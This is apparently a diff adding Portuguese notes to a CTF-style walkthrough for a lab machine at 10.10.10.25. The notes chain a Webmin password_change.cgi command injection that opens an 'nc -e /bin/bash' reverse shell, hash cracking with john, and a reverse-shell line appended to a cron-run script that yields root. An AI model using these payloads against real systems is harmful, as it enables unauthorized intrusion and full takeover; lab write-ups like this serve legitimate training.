@@ -15,3 +15,52 @@ nmap -sV -sC -Pn -v -p- 10.10.10.25
 dirb http://10.10.10.25 -d /usr/shere/wordlists/dirb/big.txt  
 
  http://10.10.10.25/robots.txt (CODE:200|SIZE:105) 
+
+searchsploit webmin 
+47293.sh 
+
+nc -nlvp 443
+o curl foi atualizado o payload 
+curl -ks https://10.10.10.25:13337/password_change.cgi \
+  -d 'user=wheel&pam=&expired=2&old=id|ifconfig; old=id|nc -e /bin/bash 1&new1=wheel&new2=wheel' \
+  -H 'Cookie: redirect=1; testing=1; sid=x; sessiontest=1;' \
+  -H "Content-Type: application/x-www-form-urlencoded" \  
+  -H 'Referer: https://10.10.10.25:13337/session_login.cgi'
+id
+
+procurar o /etc/passwd pegue hash do usuario Zenitsu
+
+machine attacker
+vi <arq_name> salve sua hash
+
+john <arq_name>
+
+target machine
+
+faça loging com Zenitsu
+su Zenitsu
+
+procure por send_message_to_nezuko.sh
+
+cat send_message_to_nezuko.sh
+
+cat send_message_to_nezuko.sh
+cat send_message_to_nezuko.sh
+#!/bin/bash
+date=$(date '+%d-%m-%Y_%H:%M')
+echo "nezuko chan, would you like to go on a date with me? " > /home/nezuu/new_message_$date
+
+vamos inserir rander aqui
+echo "nc  <Ataccker_machine> <door I used 80> -e /bin/bash" >> send_message_to_nezuko.sh
+
+
+Ataccker_machine
+nc -nlvp 80
+espere uns 5minutos e pronto 
+
+listening on [any] 80 ...
+connect to [10.10.10.4] from (UNKNOWN) [10.10.10.25] 37100
+id 
+uid=0(root) gid=0(root) groups=0(root)
+whoami
+root
